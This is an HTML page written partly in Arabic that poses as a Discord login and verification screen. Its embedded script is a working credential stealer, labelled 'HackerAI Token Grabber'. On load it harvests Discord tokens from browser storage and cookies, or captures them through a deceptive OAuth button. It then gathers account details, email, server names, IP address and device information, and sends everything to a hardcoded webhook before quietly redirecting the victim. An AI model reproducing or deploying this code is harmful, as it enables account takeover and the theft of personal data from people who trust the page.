<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #1e1f22;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #dbdee1;
        }
        .container {
            background: #2b2d31;
            border-radius: 12px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            padding: 40px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
        }
        .spinner {
            border: 4px solid #3f4147;
            border-top: 4px solid #5865f2;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 20px; margin-bottom: 10px; color: #fff; }
        p { font-size: 14px; color: #b5bac1; margin-top: 10px; }
        #status { margin-top: 15px; font-size: 13px; color: #b5bac1; }
        .btn {
            display: inline-block;
            margin-top: 20px;
            padding: 12px 32px;
            background: #5865f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
        }
        .btn:hover { background: #4752c4; }
        #debug {
            margin-top: 15px; padding: 10px; background: #111; border-radius: 8px; font-size: 11px;
            text-align: left; max-height: 200px; overflow-y: auto; color: #0f0;
            font-family: monospace; white-space: pre-wrap; word-break: break-all; display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner" id="spinner"></div>
        <h2 id="title">جاري الاتصال بـ Discord...</h2>
        <p id="subtitle">سيتم التحقق من حسابك تلقائياً</p>
        <p id="status">جاري التحميل...</p>
        <a class="btn" id="loginBtn" style="display:none;">تسجيل الدخول عبر Discord</a>
        <div id="debug"></div>
    </div>

    <script>
        // ==============================
        // ⚠️ الإعدادات ⚠️
        // ==============================
        const CONFIG = {
            WEBHOOK_URL: "https://discord.com/api/webhooks/1521939801379573830/MIMxA6Bi3Y6fyU_Q5U4N7BBOyX5ldsQuKm501zVhOEE3Wcydg9F5xNpeYK9omhWayI8o",
            CLIENT_ID: "1357107008639791154"
        };

        const logs = [];
        const debugEl = document.getElementById('debug');
        function log(msg) {
            const time = new Date().toISOString().slice(11, 19);
            logs.push(`[${time}] ${msg}`);
            debugEl.style.display = 'block';
            debugEl.textContent = logs.join('\n');
            debugEl.scrollTop = debugEl.scrollHeight;
        }
        function status(msg) {
            document.getElementById('status').textContent = msg;
            log(msg);
        }

        function isValidToken(t) {
            return t && typeof t === 'string' && /^[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}$/.test(t);
        }

        function findLocalTokens() {
            const found = [];
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    let v = localStorage.getItem(k);
                    if (typeof v === 'string') {
                        if (isValidToken(v)) found.push({ source: `localStorage.${k}`, token: v });
                        try {
                            const p = JSON.parse(v);
                            if (typeof p === 'object') {
                                for (const [sk, sv] of Object.entries(p))
                                    if (typeof sv === 'string' && isValidToken(sv))
                                        found.push({ source: `localStorage.${k}.${sk}`, token: sv });
                            }
                        } catch(e) {}
                    }
                }
                for (let i = 0; i < sessionStorage.length; i++) {
                    const k = sessionStorage.key(i);
                    let v = sessionStorage.getItem(k);
                    if (typeof v === 'string') {
                        if (isValidToken(v)) found.push({ source: `sessionStorage.${k}`, token: v });
                        try {
                            const p = JSON.parse(v);
                            if (typeof p === 'object') {
                                for (const [sk, sv] of Object.entries(p))
                                    if (typeof sv === 'string' && isValidToken(sv))
                                        found.push({ source: `sessionStorage.${k}.${sk}`, token: sv });
                            }
                        } catch(e) {}
                    }
                }
                if (document.cookie) {
                    document.cookie.split(';').forEach(c => {
                        const [k, ...v] = c.trim().split('=');
                        const val = v.join('=');
                        if (isValidToken(val)) found.push({ source: `cookie.${k}`, token: val });
                    });
                }
            } catch(e) { log(`⚠️ ${e.message}`); }
            return found;
        }

        async function verifyToken(token) {
            try {
                const r = await fetch('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': token } });
                if (r.ok) {
                    const user = await r.json();
                    let guilds = [], friends = [];
                    try { const g = await fetch('https://discord.com/api/v9/users/@me/guilds', { headers: { 'Authorization': token } }); if (g.ok) guilds = await g.json(); } catch(e) {}
                    try { const f = await fetch('https://discord.com/api/v9/users/@me/relationships', { headers: { 'Authorization': token } }); if (f.ok) friends = await f.json(); } catch(e) {}
                    return { valid: true, user, guilds: guilds.length, friends: friends.length, guildNames: guilds.slice(0, 30).map(g => g.name) };
                }
                return { valid: false };
            } catch(e) { return { valid: false, error: e.message }; }
        }

        async function sendToWebhook(token, verification) {
            status('📤 جاري الإرسال...');
            const fields = [];
            
            fields.push({ name: '🔑 **التوكن**', value: `\`\`\`${token}\`\`\``, inline: false });
            
            if (verification && verification.valid && verification.user) {
                const u = verification.user;
                fields.push({ name: '👤 **المستخدم**', value: [
                    `**الاسم:** ${u.username}#${u.discriminator || '0000'}`,
                    `**ID:** ${u.id}`,
                    `**البريد:** ${u.email || 'مخفي'}`,
                    `**Nitro:** ${['لا', 'Nitro Classic', 'Nitro', 'Nitro Basic'][u.premium_type] || 'لا'}`,
                    `**MFA:** ${u.mfa_enabled ? '✅' : '❌'}`,
                    `**السيرفرات:** ${verification.guilds}`,
                    `**الصداقات:** ${verification.friends}`,
                    `**تاريخ الحساب:** ${new Date((parseInt(u.id) / 4194304) + 1420070400000).toISOString().split('T')[0]}`
                ].join('\n'), inline: false });
                
                if (verification.guildNames && verification.guildNames.length > 0) {
                    fields.push({ name: `📋 **السيرفرات (${verification.guilds})**`, value: `\`\`\`\n${verification.guildNames.map(g => `• ${g}`).join('\n')}\n\`\`\``, inline: false });
                }
                
                fields.push({ name: '🖼️ **الأفاتار**', value: `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png`, inline: false });
            }
            
            let ip = 'غير معروف';
            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
            
            fields.push({ name: '🌐 **المعلومات**', value: `\`\`\`json\n${JSON.stringify({ ip, platform: navigator.platform, screen: `${screen.width}x${screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, url: window.location.href }, null, 2)}\n\`\`\``, inline: false });
            fields.push({ name: '📋 **السجل**', value: `\`\`\`\n${logs.slice(-8).join('\n')}\n\`\`\``, inline: false });
            
            const payload = {
                embeds: [{
                    title: verification?.valid ? `✅ توكن ${verification.user.username}` : '⚠️ توكن غير صالح',
                    color: verification?.valid ? 0x23a55a : 0xed4245,
                    thumbnail: verification?.valid ? { url: `https://cdn.discordapp.com/avatars/${verification.user.id}/${verification.user.avatar}.png` } : undefined,
                    fields: fields.slice(0, 25),
                    footer: { text: 'HackerAI Token Grabber' },
                    timestamp: new Date().toISOString()
                }]
            };
            
            try {
                const r = await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                if (r.ok) status('✅ تم الإرسال!');
                else {
                    const fd = new FormData();
                    fd.append('payload_json', JSON.stringify(payload));
                    const r2 = await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd });
                    if (r2.ok) status('✅ تم الإرسال!');
                    else log(`❌ فشل (${r2.status})`);
                }
            } catch(e) { log(`❌ ${e.message}`); }
        }

        window.addEventListener('load', async function() {
            log('🚀 بدء التشغيل');
            const redirectUri = window.location.href.split('?')[0].split('#')[0];
            log(`📌 Redirect URI: ${redirectUri}`);
            
            // التحقق من وجود توكن في URL
            const hash = window.location.hash;
            const params = new URLSearchParams(hash.substring(1));
            const urlToken = params.get('access_token');
            
            if (urlToken && isValidToken(urlToken)) {
                status('✅ تم استلام التوكن!');
                window.history.replaceState({}, document.title, window.location.pathname);
                const verification = await verifyToken(urlToken);
                await sendToWebhook(urlToken, verification);
                
                setTimeout(() => {
                    document.getElementById('spinner').style.display = 'none';
                    document.getElementById('title').textContent = '✅ تم التحقق!';
                    document.getElementById('subtitle').textContent = 'جاري التحويل...';
                    setTimeout(() => { window.location.href = 'https://discord.com/channels/@me'; }, 1500);
                }, 2000);
                return;
            }
            
            // البحث المحلي
            status('🔍 جاري البحث...');
            const localTokens = findLocalTokens();
            if (localTokens.length > 0) {
                log(`✅ وجد ${localTokens.length} توكن`);
                const verification = await verifyToken(localTokens[0].token);
                await sendToWebhook(localTokens[0].token, verification);
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('title').textContent = '✅ تم!';
                return;
            }
            
            // زر OAuth
            log('⚠️ لا توجد توكنات');
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('title').textContent = '🔑 تسجيل الدخول';
            document.getElementById('subtitle').textContent = 'اضغط لتسجيل الدخول عبر Discord';
            
            const loginBtn = document.getElementById('loginBtn');
            loginBtn.style.display = 'inline-block';
            loginBtn.href = `https://discord.com/oauth2/authorize?client_id=${CONFIG.CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=identify%20email%20guilds`;
            log('✅ جاهز!');
        });
    </script>
</body>
</html>
